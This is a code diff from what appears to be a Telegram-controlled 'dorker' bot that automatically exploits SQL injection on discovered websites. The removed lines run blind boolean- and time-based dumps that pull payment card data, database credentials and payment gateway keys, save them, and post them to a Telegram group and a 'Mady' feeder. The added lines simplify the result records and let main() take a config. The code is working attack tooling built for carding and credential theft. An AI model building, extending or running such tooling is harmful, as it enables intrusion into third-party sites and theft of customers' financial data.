-                                                "tables": len(dump.tables),
-                                                "total_rows": dump.total_rows,
-                                                "cards": 0,
-                                                "credentials": 0,
-                                                "gateway_keys": 0,
-                                            }
-                                        )
-
-                                except Exception as dump_err:
-                                    logger.error(f"Dump error: {dump_err}")
-                                    await update.message.reply_text(
-                                        f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:100]}",
-                                        parse_mode="HTML",
-                                    )
-
-                            # Blind dumping (boolean/time-based)
-                            elif (
-                                p.config.dumper_enabled
-                                and p.config.dumper_blind_enabled
-                                and r.injection_type in ("boolean", "time")
-                            ):
-                                await update.message.reply_text(
-                                    f"💉 <b>Blind Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
-                                    f"Param: <code>{r.parameter}</code>\n"
-                                    f"DBMS: {r.dbms or 'Unknown'}\n"
-                                    f"🐢 Extracting data char-by-char (this is slow)...",
-                                    parse_mode="HTML",
-                                )
-
-                                try:
-                                    dump = await p.dumper.blind_targeted_dump(
-                                        r, session
-                                    )
-                                    
-                                    # Run deep-parse via AutoDumper for secrets/PII/hashes/combos
-                                    if dump and p.auto_dumper and (dump.has_valuable_data or dump.total_rows > 0):
-                                        try:
-                                            from auto_dumper import ParsedDumpData
-                                            _dp = ParsedDumpData(url=r.url, source="scan_blind")
-                                            await p.auto_dumper._deep_parse_rows(dump, _dp)
-                                        except Exception as dp_err:
-                                            logger.debug(f"Deep-parse in /scan blind: {dp_err}")
-
-                                    if dump.has_valuable_data or dump.total_rows > 0:
-                                        saved = p.dumper.save_dump(
-                                            dump, prefix="blind_"
-                                        )
-
-                                        dump_info = {
+                                        all_dump_results.append({
                                             "url": r.url,
                                             "param": r.parameter,
-                                            "type": f"blind_{r.injection_type}",
-                                            "dbms": dump.dbms,
-                                            "database": dump.database,
-                                            "tables": len(dump.tables),
-                                            "total_rows": dump.total_rows,
-                                            "cards": len(dump.card_data),
-                                            "credentials": len(dump.credentials),
-                                            "gateway_keys": len(dump.gateway_keys),
-                                            "files": saved,
-                                        }
-                                        all_dump_results.append(dump_info)
-
-                                        await p.reporter.report_data_dump(
-                                            r.url,
-                                            dump.dbms,
-                                            dump.database,
-                                            dump.tables,
-                                            {
-                                                t: len(rows)
-                                                for t, rows in dump.data.items()
-                                            },
-                                            saved,
-                                        )
-
-                                        if dump.card_data:
-                                            p.found_cards.extend(dump.card_data)
-                                            for card in dump.card_data:
-                                                p.db.add_card_data(r.url, card)
-                                            await p.reporter.report_card_data(
-                                                r.url, dump.card_data
-                                            )
-
-                                        if dump.credentials:
-                                            for cred in dump.credentials:
-                                                p.found_secrets.append(
-                                                    {
-                                                        "url": r.url,
-                                                        "type": "db_credential",
-                                                        "value": str(cred),
-                                                        "source": "blind_sqli_dump",
-                                                        "time": datetime.now().isoformat(),
-                                                    }
-                                                )
-
-                                        if dump.gateway_keys:
-                                            for key_entry in dump.gateway_keys:
-                                                for col, val in key_entry.items():
-                                                    p.found_gateways.append(
-                                                        {
-                                                            "url": r.url,
-                                                            "type": f"db_{col}",
-                                                            "value": val,
-                                                            "source": "blind_sqli_dump",
-                                                            "time": datetime.now().isoformat(),
-                                                        }
-                                                    )
-                                                    p.db.add_gateway_key(
-                                                        r.url,
-                                                        f"db_{col}",
-                                                        val,
-                                                        source="blind_sqli_dump",
-                                                    )
-                                                    await p.reporter.report_gateway(
-                                                        r.url,
-                                                        f"DB: {col}",
-                                                        val,
-                                                        {
-                                                            "source": f"Blind {r.injection_type} SQLi dump via /scan"
-                                                        },
-                                                    )
-                                                    # Feed to Mady bot
-                                                    if p.mady_feeder:
-                                                        try:
-                                                            p.mady_feeder.feed_gateway(
-                                                                r.url,
-                                                                f"db_{col}",
-                                                                val,
-                                                                source="scan_blind_dump",
-                                                            )
-                                                        except Exception:
-                                                            pass
-
-                                        # Feed /scan blind dump to Mady
-                                        if p.mady_feeder:
-                                            try:
-                                                p.mady_feeder.feed_dump(
-                                                    r.url,
-                                                    dump.dbms,
-                                                    dump.database or "N/A",
-                                                    tables=len(dump.tables),
-                                                    rows=dump.total_rows,
-                                                    cards=len(dump.card_data),
-                                                    credentials=len(dump.credentials),
-                                                    gateway_keys=len(dump.gateway_keys),
-                                                    dump_type=r.injection_type,
-                                                    source="scan_blind_dump",
-                                                )
-                                            except Exception:
-                                                pass
-
-                                        dump_text = (
-                                            f"🐢📦 <b>Blind Dump Successful!</b>\n"
-                                            f"Type: {r.injection_type}-based\n"
-                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
-                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
-                                        )
-                                        if dump.card_data:
-                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
-                                        if dump.credentials:
-                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
-                                        if dump.gateway_keys:
-                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
+                                            "type": r.injection_type,
+                                            "dbms": r.dbms or "Unknown",
+                                            "tables": 0,
+                                            "total_rows": 0,
+                                            "cards": 0,
+                                            "credentials": 0,
+                                            "gateway_keys": 0,
+                                        })
                                         await update.message.reply_text(
-                                            dump_text, parse_mode="HTML"
-                                        )
-                                    else:
-                                        all_dump_results.append(
-                                            {
-                                                "url": r.url,
-                                                "param": r.parameter,
-                                                "type": f"blind_{r.injection_type}",
-                                                "dbms": dump.dbms,
-                                                "tables": len(dump.tables),
-                                                "total_rows": dump.total_rows,
-                                                "cards": 0,
-                                                "credentials": 0,
-                                                "gateway_keys": 0,
-                                            }
+                                            f"⚠️ SQLi confirmed but no card/payment data extracted.\n"
+                                            f"Type: {r.injection_type} | DBMS: {r.dbms or 'Unknown'}",
+                                            parse_mode="HTML",
                                         )
 
                                 except Exception as dump_err:
-                                    logger.error(f"Blind dump error: {dump_err}")
+                                    logger.error(f"Auto-dump error in /scan: {dump_err}")
                                     await update.message.reply_text(
-                                        f"⚠️ Blind injection confirmed but dump failed: {str(dump_err)[:100]}",
+                                        f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:200]}",
                                         parse_mode="HTML",
                                     )
 
@@ -7198,9 +7183,9 @@ async def cmd_checkkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
   # ==================== ENTRY POINT ==
 
 
-def main():
-    """Main entry point."""
-    config = DorkerConfig()
+def main(config: DorkerConfig = None):
+    """Main entry point. Pass a config to override defaults."""
+    config = config or DorkerConfig()
 
     if not config.telegram_bot_token:
         logger.error(
@@ -7283,7 +7268,7 @@ def main():
 
         async def post_init(application: Application) -> None:
             global pipeline_task
-            p = get_pipeline()
+            p = get_pipeline(config)
             p.set_telegram_context(application.bot, int(config.telegram_group_id))
             logger.info("Auto-starting pipeline (auto_start_pipeline=True)...")
             pipeline_task = asyncio.create_task(p.start())
